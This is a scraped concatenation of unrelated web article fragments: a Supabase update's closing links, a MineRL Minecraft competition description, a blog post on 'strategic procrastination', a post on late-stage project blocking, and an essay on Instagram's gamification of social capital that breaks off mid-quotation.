more code snippets</li><li>UX improvements - with a simplified and consistent UX</li></ul><h3>Hiring</h3><ul><li>This month we <a href="https://supabase.io/blog/2020/06/15/supabase-steve-chavez">welcome Steve Chavez to the team</a>. Steve is a maintainer of PostgREST, one of the core tools which makes Supabase possible. </li><li>We're hiring a part-time designer or UX expert. See more <a href="https://news.ycombinator.com/item?id=23708351" target="_blank" rel="noopener noreferrer">here</a>.</li></ul><h3>Get started</h3><ul><li>Start using Supabase today: <a href="https://app.supabase.io/">app.supabase.io</a></li><li>Make sure to <a href="https://github.com/supabase/supabase" target="_blank" rel="noopener noreferrer">star us on GitHub</a></li><li>Follow us <a href="https://twitter.com/supabase_io" target="_blank" rel="noopener noreferrer">on Twitter</a></li><li>Become a <a href="https://github.com/sponsors/supabase" target="_blank" rel="noopener noreferrer">sponsor</a></li></ul></section></div>]]>

<p>We are holding a competition on sample-efficient reinforcement learning using human priors. Standard methods require 
months to years of game time to attain human performance in complex games such as Go and StarCraft. In our competition,
 participants develop a system to obtain a diamond in Minecraft using only four days of training time.

<p>The MineRL competition offeres a set of Gym environments paired with human demonstrations to provide participants with
the ability to tackle the difficult Minecraft sample efficiently. This year we are introducing a new 
vectorized action and observation space that obscures the agent’s actions to prevent participants from using domain
knowlege to solve the ObtainDiamond task!</p>

<h3> The Task: Obtain Diamond in Minecraft </h3>

<p>Minecraft is a 3D, first-person, open-world game centered around the gathering of resources and creation of structures and items. These structures and items have prerequisite tools and materials required for their creation. As a result, many items require the completion of a series of natural subtasks.</p>

<p>The procedurally generated world is composed of discrete blocks that allow modification. Over the course of gameplay, players change their surroundings by gathering resources and constructing structures.</p>

<p>In this competition, the goal is to obtain a diamond. The agent begins in a random starting location without any items, and receives rewards for obtaining items which are prerequisites for diamond.</p>

<p>Most people have more to do than time to do it.</p><p>The <a href="https://en.wikipedia.org/wiki/Time_management#The_Eisenhower_Method">Eisenhower Prioritization Matrix</a> is a conceptual tool for time management that can help people decide what to work on. It’s a 2x2 matrix with urgency on one axis and importance on the other.</p><figure><img src="https://bbirnbaum.com/content/images/2020/06/eisenhower_matrix-2.png"></figure><p>Urgent and important tasks, the thinking goes, should be done right away. Non-urgent but important tasks should be scheduled. Urgent and unimportant tasks should be delegated. And non-urgent, unimportant tasks shouldn’t be done at all.</p><p>The insight behind this matrix is that people often spend too much time on urgent tasks and not enough time on important tasks. So by delegating urgent but unimportant tasks, you can free up time for important things you might not get to otherwise.</p><p>I’ve found this tool to be helpful in reminding me to focus on what’s important. But it doesn’t address another problem I have: even if I’m only working on what’s important, always starting with what’s most urgent can mean that I don’t have enough time for less urgent tasks. I’m too much of a perfectionist.</p><p>For example, when I start work in the morning, I almost always need to spend some time preparing for my meetings that day. This work is both urgent (they are happening today) and important (no one else can do it). So by the logic of the Eisenhower matrix, preparing for these meetings should be the first thing that I do.</p><p>But when I follow this reasoning, I often find myself putting too much time into the meeting prep. I might second-guess what I’m doing, spend too much time researching something tangential, or get distracted by a topic unlikely to come up in the meeting. So instead of always prioritizing what's most urgent first, I've learned to practice "strategic procrastination": purposely delaying urgent tasks to constrain the amount of time that I can spend on them.</p><p>For example, at the beginning of my morning at work, I might estimate how much time I’ll need to prepare for my meetings and then delay starting that work until I have exactly that amount of time left. Before then I’ll work on one of my other, less urgent tasks. In this way, I’m leveraging the urgency of a task to limit how much time I spend on it.</p><p>Strategic procrastination is also useful on longer time scales. When I have to prepare a presentation, for example, I often find myself wasting time on minor things, like tweaking formatting, instead of developing the core content. To avoid this I employ strategic procrastination. I delay starting work on the presentation until I have just enough time to complete it.</p><p>I sometimes adjust this method when the task requires creativity. Instead of completely delaying when I begin a task, I get started right away, but I do just enough to begin thinking about it. For a presentation, I might first spend 30 minutes writing a rough outline and then put the task aside for a few weeks. This gives me a chance to ruminate on it during downtime, and I often get ideas that I wouldn’t have gotten otherwise.</p><p>There is actually some experimental evidence behind my intuition that this approach can improve creativity. As described in <a href="https://journals.aom.org/doi/10.5465/amj.2018.1471">this paper</a> and in the book <em><a href="https://amzn.to/3dvwnjH">Originals</a></em> (which also uses the term “strategic procrastination”), students who played video games for a moderate amount of time while working on business problems came up with more creative solutions.</p><p>Strategic procrastination comes with a major risk, of course. There’s a reason that it’s usually considered good advice to not wait until the last minute to do things. If I misestimate how much time I need to perform a task, then I either need to scramble to complete it or the quality will suffer. So strategic procrastination is only a good idea when I’m confident about long it will take or if it’s not a big deal to underperform.</p><p>As long as I consider this risk, strategic procrastination has been a helpful tool to make sure I have enough time for important but non-urgent tasks. Sometimes waiting until the last minute is exactly what makes me the most productive.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>
